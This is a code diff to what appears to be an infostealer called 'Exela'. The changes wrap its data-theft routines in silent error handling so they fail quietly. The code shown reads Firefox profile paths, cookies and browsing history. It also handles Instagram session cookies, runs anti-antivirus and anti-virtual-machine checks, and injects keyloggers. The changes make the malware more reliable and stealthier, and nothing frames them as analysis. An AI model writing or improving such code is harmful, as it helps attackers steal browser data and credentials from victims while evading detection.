@@ -299,10 +299,13 @@ class QuicaxdExela:
         except:
             pass
     def GetMozillaProfiles(self):
-        list_directory = os.listdir(self.MozillaPath)
-        for listed_dir in list_directory:
-            new_dir = os.path.join(self.MozillaPath, listed_dir)
-            self.mozilla_profiles_full_path.append(new_dir)
+        try:
+            list_directory = os.listdir(self.MozillaPath)
+            for listed_dir in list_directory:
+                new_dir = os.path.join(self.MozillaPath, listed_dir)
+                self.mozilla_profiles_full_path.append(new_dir)
+        except:
+            pass
     def get_cookies_firefox(self):
         for file in self.mozilla_profiles_full_path:
             history_path = os.path.join(file, "cookies.sqlite")
@@ -333,11 +336,14 @@ class QuicaxdExela:
             if not os.path.isfile(history_path):
                 continue
             else:
-                conn = sqlite3.connect(history_path)
-                cursor = conn.cursor()
-                for row in cursor.execute("SELECT id, url, title, visit_count, last_visit_date FROM moz_places;").fetchall():
-                    self.historys
-                    self.mozilla_history.append(f"ID : {row[0]} | URL : {row[1]} | Title : {row[2]} | Visit Count : {row[3]} | Last Visit Time {row[4]}")
+                try:
+                    conn = sqlite3.connect(history_path)
+                    cursor = conn.cursor()
+                    for row in cursor.execute("SELECT id, url, title, visit_count, last_visit_date FROM moz_places;").fetchall():
+                        self.historys+=1
+                        self.mozilla_history.append(f"ID : {row[0]} | URL : {row[1]} | Title : {row[2]} | Visit Count : {row[3]} | Last Visit Time {row[4]}")
+                except:
+                    pass
     def setInstaSession(self, cookie, value):
         try:
             pp = "https://i.hizliresim.com/8po0puy.jfif"
@@ -1486,14 +1492,17 @@ def injectKeyloggers():
         except Exception as e:
             print(str(e))
 def callAllFunctions():
-    Antivirustotal()
-    if Anti_Vm == "false":
-        thread = threading.Thread(target=QuicaxdExela,daemon=True)
-        thread.start()
-        thread.join()
-    else:
-        HardAntiVM()
-    injectKeyloggers()
+    try:
+        Antivirustotal()
+        if Anti_Vm == "false":
+            thread = threading.Thread(target=QuicaxdExela,daemon=True)
+            thread.start()
+            thread.join()
+        else:
+            HardAntiVM()
+        injectKeyloggers()
+    except:
+        pass
 if __name__ == "__main__":
     if not create_mutex("Exela"):
         print("mutex already exist")
